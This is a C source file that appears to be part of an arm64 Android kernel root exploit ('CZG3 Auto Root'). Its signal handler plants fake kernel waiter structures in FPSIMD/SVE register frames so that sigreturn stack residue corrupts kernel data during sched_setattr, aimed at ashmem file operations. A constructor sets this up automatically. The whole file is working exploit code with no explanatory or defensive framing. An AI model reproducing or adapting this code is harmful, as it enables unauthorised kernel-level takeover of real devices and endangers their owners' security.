#include "common.h"
#include "czg3_auto_sigreturn.h"
#include "czg3_diag.h"

#if defined(APP_CZG3_AUTOROOT_SIGRETURN) && APP_CZG3_AUTOROOT_SIGRETURN

#include <asm/sigcontext.h>
#include <ucontext.h>

extern long __real_syscall(long number, ...);

enum czg3_sigreturn_phase {
  CZG3_SIGRETURN_INACTIVE = 0,
  CZG3_SIGRETURN_FRAME_READY = 1,
  CZG3_SIGRETURN_SCHED_STARTED = 2,
  CZG3_SIGRETURN_DONE = 3,
};

static atomic_int sigreturn_preflight_state;
static atomic_int sigreturn_preflight_waiter_off;
static atomic_int sigreturn_probe_only;
static atomic_int sigreturn_handler_done;
static atomic_int sigreturn_handler_status;
static atomic_int sigreturn_handler_found_fpsimd;
static atomic_int sigreturn_handler_found_sve;
static atomic_int sigreturn_handler_waiter_off;

static atomic_int sigreturn_phase;
static atomic_int sigreturn_waiter_tid;
static atomic_long sigreturn_sched_ret;
static atomic_int sigreturn_sched_errno;

static unsigned char sigreturn_payload_fpsimd[0x200];
static unsigned char sigreturn_payload_sve[0x200];

_Static_assert(ATOMIC_INT_LOCK_FREE == 2,
               "CZG3 signal-handler atomics must be lock-free");
_Static_assert(sizeof(struct fpsimd_context) == 0x210,
               "unexpected arm64 FPSIMD context size");
_Static_assert(sizeof(((struct fpsimd_context *)0)->vregs) == 0x200,
               "unexpected arm64 FPSIMD register payload size");
_Static_assert(SIGRETURN_FPSIMD_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
               "CZG3 waiter must fit in FPSIMD registers");
_Static_assert(SIGRETURN_SVE_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
               "CZG3 waiter must fit in SVE-shaped FPSIMD registers");

static int czg3_auto_mode(void) {
  const char *mode = getenv("RMG_INVOCATION_MODE");
  return mode && strcmp(mode, "auto_root") == 0;
}

static int czg3_fops_route_active(void) {
  return slide_oracle_parent == fake_fops &&
         slide_oracle_target == data_addr(ASHMEM_MISC_FOPS);
}

static int scan_signal_records(unsigned char *cursor, size_t bytes,
                               struct fpsimd_context **fpsimd,
                               int *saw_sve,
                               unsigned char **extra_data,
                               size_t *extra_bytes) {
  unsigned char *end = cursor + bytes;
  while ((size_t)(end - cursor) >= sizeof(struct _aarch64_ctx)) {
    struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;
    if (header->magic == 0 && header->size == 0) {
      return 1;
    }
    if (header->size < sizeof(*header) || (header->size & 15) != 0 ||
        (size_t)(end - cursor) < header->size) {
      return 0;
    }
    if (header->magic == FPSIMD_MAGIC) {
      if (header->size < sizeof(struct fpsimd_context)) {
        return 0;
      }
      *fpsimd = (struct fpsimd_context *)header;
    } else if (header->magic == SVE_MAGIC) {
      *saw_sve = 1;
    } else if (header->magic == EXTRA_MAGIC &&
               header->size >= sizeof(struct extra_context)) {
      struct extra_context *extra = (struct extra_context *)header;
      if (extra->datap && extra->size >= sizeof(struct _aarch64_ctx) &&
          extra->size <= 65536) {
        *extra_data = (unsigned char *)(uintptr_t)extra->datap;
        *extra_bytes = extra->size;
      }
    }
    cursor += header->size;
  }
  return 0;
}

static void czg3_sigreturn_handler(int signal_number,
                                   siginfo_t *signal_info,
                                   void *user_context) {
  (void)signal_number;
  (void)signal_info;
  ucontext_t *context = user_context;
  struct fpsimd_context *fpsimd = NULL;
  unsigned char *extra_data = NULL;
  size_t extra_bytes = 0;
  int saw_sve = 0;
  int status = -3;

  atomic_store_explicit(&sigreturn_handler_found_fpsimd, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_found_sve, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_waiter_off, -1,
                        memory_order_relaxed);

  if (!scan_signal_records(context->uc_mcontext.__reserved,
                           sizeof(context->uc_mcontext.__reserved),
                           &fpsimd, &saw_sve,
                           &extra_data, &extra_bytes)) {
    status = -2;
    goto done;
  }
  if (extra_data &&
      !scan_signal_records(extra_data, extra_bytes, &fpsimd, &saw_sve,
                           &extra_data, &extra_bytes)) {
    status = -6;
    goto done;
  }
  if (!fpsimd) {
    goto done;
  }

  size_t waiter_off = saw_sve ? SIGRETURN_SVE_WAITER_OFF
                              : SIGRETURN_FPSIMD_WAITER_OFF;
  if (waiter_off + FAKE_WAITER_LAYOUT_SIZE > sizeof(fpsimd->vregs)) {
    status = -5;
    goto done;
  }

  atomic_store_explicit(&sigreturn_handler_found_fpsimd, 1,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_found_sve, saw_sve,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_waiter_off, (int)waiter_off,
                        memory_order_relaxed);

  if (atomic_load_explicit(&sigreturn_probe_only, memory_order_relaxed)) {
    status = 1;
    goto done;
  }

  if ((int)waiter_off !=
      atomic_load_explicit(&sigreturn_preflight_waiter_off,
                           memory_order_relaxed)) {
    status = -7;
    goto done;
  }

  volatile unsigned char *destination =
      (volatile unsigned char *)fpsimd->vregs;
  const unsigned char *source = saw_sve ? sigreturn_payload_sve
                                        : sigreturn_payload_fpsimd;
  for (size_t index = 0; index < sizeof(sigreturn_payload_fpsimd); index++) {
    destination[index] = source[index];
  }
  status = 1;

done:
  atomic_store_explicit(&sigreturn_handler_status, status,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_done, 1, memory_order_release);
}

static int self_signal_sigusr2(void) {
  siginfo_t signal_info;
  memset(&signal_info, 0, sizeof(signal_info));
  signal_info.si_signo = SIGUSR2;
  signal_info.si_code = SI_QUEUE;
  signal_info.si_pid = getpid();
  signal_info.si_uid = getuid();
  errno = 0;
  return (int)syscall(SYS_rt_tgsigqueueinfo, getpid(),
                      (int)syscall(SYS_gettid), SIGUSR2, &signal_info);
}

static int run_sigreturn_preflight(void) {
  struct sigaction action;
  struct sigaction old_action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = czg3_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) != 0) {
    return 0;
  }
  if (sigaction(SIGUSR2, &action, &old_action) != 0) {
    return 0;
  }

  atomic_store_explicit(&sigreturn_probe_only, 1, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_done, 0, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_status, 0, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_waiter_off, -1,
                        memory_order_relaxed);

  int ret = self_signal_sigusr2();
  int saved_errno = errno;
  int done = atomic_load_explicit(&sigreturn_handler_done,
                                  memory_order_acquire);
  int status = atomic_load_explicit(&sigreturn_handler_status,
                                    memory_order_relaxed);
  int waiter_off = atomic_load_explicit(&sigreturn_handler_waiter_off,
                                        memory_order_relaxed);
  int found_fpsimd = atomic_load_explicit(&sigreturn_handler_found_fpsimd,
                                          memory_order_relaxed);
  int saw_sve = atomic_load_explicit(&sigreturn_handler_found_sve,
                                     memory_order_relaxed);

  atomic_store_explicit(&sigreturn_probe_only, 0, memory_order_relaxed);
  int restore_ok = sigaction(SIGUSR2, &old_action, NULL) == 0;
  if (ret == 0 && done && status == 1 && found_fpsimd && restore_ok &&
      (waiter_off == SIGRETURN_FPSIMD_WAITER_OFF ||
       waiter_off == SIGRETURN_SVE_WAITER_OFF)) {
    atomic_store_explicit(&sigreturn_preflight_waiter_off, waiter_off,
                          memory_order_relaxed);
    pr_info("CZG3 Auto Root sigreturn preflight ok fpsimd=1 sve=%d "
            "waiter_off=%#x\n",
            saw_sve, waiter_off);
    return 1;
  }

  pr_info("CZG3 Auto Root sigreturn preflight failed ret=%d errno=%d "
          "done=%d status=%d fpsimd=%d sve=%d waiter_off=%#x restore=%d\n",
          ret, saved_errno, done, status, found_fpsimd, saw_sve,
          waiter_off, restore_ok);
  return 0;
}

static void build_sigreturn_waiters(void) {
  memset(sigreturn_payload_fpsimd, 0, sizeof(sigreturn_payload_fpsimd));
  memset(sigreturn_payload_sve, 0, sizeof(sigreturn_payload_sve));
  put_fake_waiter(sigreturn_payload_fpsimd, SIGRETURN_FPSIMD_WAITER_OFF,
                  slide_oracle_parent, 0, slide_oracle_target,
                  slide_oracle_parent, 0, slide_oracle_target,
                  fake_task, fake_lock, FAKE_WAITER_PRIO);
  put_fake_waiter(sigreturn_payload_sve, SIGRETURN_SVE_WAITER_OFF,
                  slide_oracle_parent, 0, slide_oracle_target,
                  slide_oracle_parent, 0, slide_oracle_target,
                  fake_task, fake_lock, FAKE_WAITER_PRIO);
}

int czg3_auto_sigreturn_enabled(void) {
  return czg3_auto_mode() &&
         atomic_load_explicit(&sigreturn_preflight_state,
                              memory_order_acquire) == 1;
}

int czg3_auto_sigreturn_proxy_active_for_tid(int tid) {
  if (!czg3_auto_sigreturn_enabled() || tid <= 0 ||
      atomic_load_explicit(&sigreturn_waiter_tid,
                           memory_order_acquire) != tid) {
    return 0;
  }
  int phase = atomic_load_explicit(&sigreturn_phase, memory_order_acquire);
  return phase == CZG3_SIGRETURN_FRAME_READY ||
         phase == CZG3_SIGRETURN_SCHED_STARTED;
}

int czg3_auto_sigreturn_frame_ready_for_tid(int tid) {
  return czg3_auto_sigreturn_proxy_active_for_tid(tid) &&
         atomic_load_explicit(&sigreturn_phase,
                              memory_order_acquire) ==
             CZG3_SIGRETURN_FRAME_READY;
}

int czg3_auto_sigreturn_sched_started(int tid) {
  if (!czg3_auto_sigreturn_enabled() || tid <= 0 ||
      atomic_load_explicit(&sigreturn_waiter_tid,
                           memory_order_acquire) != tid) {
    return 0;
  }
  int expected = CZG3_SIGRETURN_FRAME_READY;
  return atomic_compare_exchange_strong_explicit(
      &sigreturn_phase, &expected, CZG3_SIGRETURN_SCHED_STARTED,
      memory_order_acq_rel, memory_order_acquire);
}

void czg3_auto_sigreturn_sched_complete(int tid, long ret, int saved_errno) {
  if (!czg3_auto_sigreturn_enabled() || tid <= 0 ||
      atomic_load_explicit(&sigreturn_waiter_tid,
                           memory_order_acquire) != tid) {
    return;
  }
  int phase = atomic_load_explicit(&sigreturn_phase, memory_order_acquire);
  if (phase != CZG3_SIGRETURN_FRAME_READY &&
      phase != CZG3_SIGRETURN_SCHED_STARTED) {
    return;
  }
  atomic_store_explicit(&sigreturn_sched_ret, ret, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_sched_errno, saved_errno,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_phase, CZG3_SIGRETURN_DONE,
                        memory_order_release);
}

static int wait_for_sched_result(long *ret_out, int *errno_out) {
  uint64_t frequency = czg3_light_read_frequency();
  uint64_t started = czg3_light_read_counter();
  uint64_t timeout_ticks = frequency
      ? ((uint64_t)APP_CZG3_SIGRETURN_START_TIMEOUT_USEC * frequency +
         999999ULL) / 1000000ULL
      : 0;

  for (;;) {
    int phase = atomic_load_explicit(&sigreturn_phase, memory_order_acquire);
    if (phase == CZG3_SIGRETURN_DONE) {
      if (ret_out) {
        *ret_out = atomic_load_explicit(&sigreturn_sched_ret,
                                        memory_order_relaxed);
      }
      if (errno_out) {
        *errno_out = atomic_load_explicit(&sigreturn_sched_errno,
                                          memory_order_relaxed);
      }
      return 1;
    }
    if (phase == CZG3_SIGRETURN_SCHED_STARTED) {
      /* Once sched_setattr has entered, never let the writer thread escape
       * while mutation may still be in flight. The outer exploit watchdog
       * remains responsible for terminating a genuinely wedged attempt. */
      while (atomic_load_explicit(&sigreturn_phase,
                                  memory_order_acquire) !=
             CZG3_SIGRETURN_DONE) {
        __asm__ volatile("yield" ::: "memory");
      }
      continue;
    }
    if (phase != CZG3_SIGRETURN_FRAME_READY) {
      return 0;
    }

    if (started && timeout_ticks) {
      uint64_t now = czg3_light_read_counter();
      if (now >= started && now - started >= timeout_ticks) {
        int expected = CZG3_SIGRETURN_FRAME_READY;
        if (atomic_compare_exchange_strong_explicit(
                &sigreturn_phase, &expected, CZG3_SIGRETURN_INACTIVE,
                memory_order_acq_rel, memory_order_acquire)) {
          return 0;
        }
        continue;
      }
    }
    __asm__ volatile("yield" ::: "memory");
  }
}

long czg3_auto_pselect_dispatch(long number, long nfds, long readfds,
                                long writefds, long exceptfds,
                                long timeout, long sigmask) {
  if (number != SYS_pselect6) {
    return __real_syscall(number, nfds, readfds, writefds, exceptfds,
                          timeout, sigmask);
  }

  if (!czg3_auto_mode() || !czg3_fops_route_active()) {
    return __real_syscall(number, nfds, readfds, writefds, exceptfds,
                          timeout, sigmask);
  }

  /* Auto Root must not fall back to the pselect writer after the dedicated
   * preflight failed: that is the exact mode in which device evidence showed
   * sched_setattr blocking until pselect return. Refuse the route before any
   * new writer mutation instead. Manual and P0 never enter this branch. */
  if (!czg3_auto_sigreturn_enabled()) {
    errno = EAGAIN;
    return -1;
  }

  int tid = (int)syscall(SYS_gettid);
  build_sigreturn_waiters();

  atomic_store_explicit(&sigreturn_waiter_tid, tid, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_sched_ret, -1, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_sched_errno, EAGAIN, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_phase, CZG3_SIGRETURN_INACTIVE,
                        memory_order_release);

  struct sigaction action;
  struct sigaction old_action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = czg3_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) != 0 ||
      sigaction(SIGUSR2, &action, &old_action) != 0) {
    atomic_store_explicit(&sigreturn_waiter_tid, 0, memory_order_release);
    errno = EAGAIN;
    return -1;
  }

  atomic_store_explicit(&sigreturn_probe_only, 0, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_done, 0, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_status, 0, memory_order_relaxed);
  atomic_store_explicit(&sigreturn_handler_waiter_off, -1,
                        memory_order_relaxed);

  int signal_ret = self_signal_sigusr2();
  int signal_errno = errno;
  int handler_done = atomic_load_explicit(&sigreturn_handler_done,
                                          memory_order_acquire);
  int handler_status = atomic_load_explicit(&sigreturn_handler_status,
                                            memory_order_relaxed);
  int actual_off = atomic_load_explicit(&sigreturn_handler_waiter_off,
                                        memory_order_relaxed);
  if (signal_ret != 0 || !handler_done || handler_status != 1 ||
      actual_off != atomic_load_explicit(&sigreturn_preflight_waiter_off,
                                         memory_order_relaxed)) {
    (void)sigaction(SIGUSR2, &old_action, NULL);
    atomic_store_explicit(&sigreturn_waiter_tid, 0, memory_order_release);
    atomic_store_explicit(&sigreturn_phase, CZG3_SIGRETURN_INACTIVE,
                          memory_order_release);
    errno = signal_ret != 0 ? signal_errno : EAGAIN;
    return -1;
  }

  /* From this point until the consumer finishes sched_setattr, deliberately
   * make no syscalls on the waiter thread. This preserves the just-restored
   * sigreturn kernel-stack residue in the same way as the established upstream
   * SIGRETURN writer. */
  atomic_store_explicit(&sigreturn_phase, CZG3_SIGRETURN_FRAME_READY,
                        memory_order_release);

  long sched_ret = -1;
  int sched_errno = EAGAIN;
  int completed = wait_for_sched_result(&sched_ret, &sched_errno);

  /* Mutation is either complete or never started before we issue any further
   * waiter-thread syscall. */
  int restore_ok = sigaction(SIGUSR2, &old_action, NULL) == 0;
  atomic_store_explicit(&sigreturn_phase, CZG3_SIGRETURN_INACTIVE,
                        memory_order_release);
  atomic_store_explicit(&sigreturn_waiter_tid, 0, memory_order_release);

  if (!completed || !restore_ok || sched_ret != 0) {
    errno = completed && sched_errno ? sched_errno : EAGAIN;
    return -1;
  }

  errno = 0;
  return 1;
}

__attribute__((constructor)) static void czg3_auto_sigreturn_preflight_ctor(void) {
  atomic_store_explicit(&sigreturn_preflight_waiter_off, -1,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_phase, CZG3_SIGRETURN_INACTIVE,
                        memory_order_relaxed);
  atomic_store_explicit(&sigreturn_waiter_tid, 0, memory_order_relaxed);
  if (!czg3_auto_mode()) {
    atomic_store_explicit(&sigreturn_preflight_state, -1,
                          memory_order_release);
    return;
  }
  int ok = run_sigreturn_preflight();
  atomic_store_explicit(&sigreturn_preflight_state, ok ? 1 : -1,
                        memory_order_release);
  pr_info("CZG3 Auto Root writer mode=%s manual_writer=pselect p0_writer=pselect\n",
          ok ? "sigreturn-proxy" : "refused-preflight-failed");
}

#endif
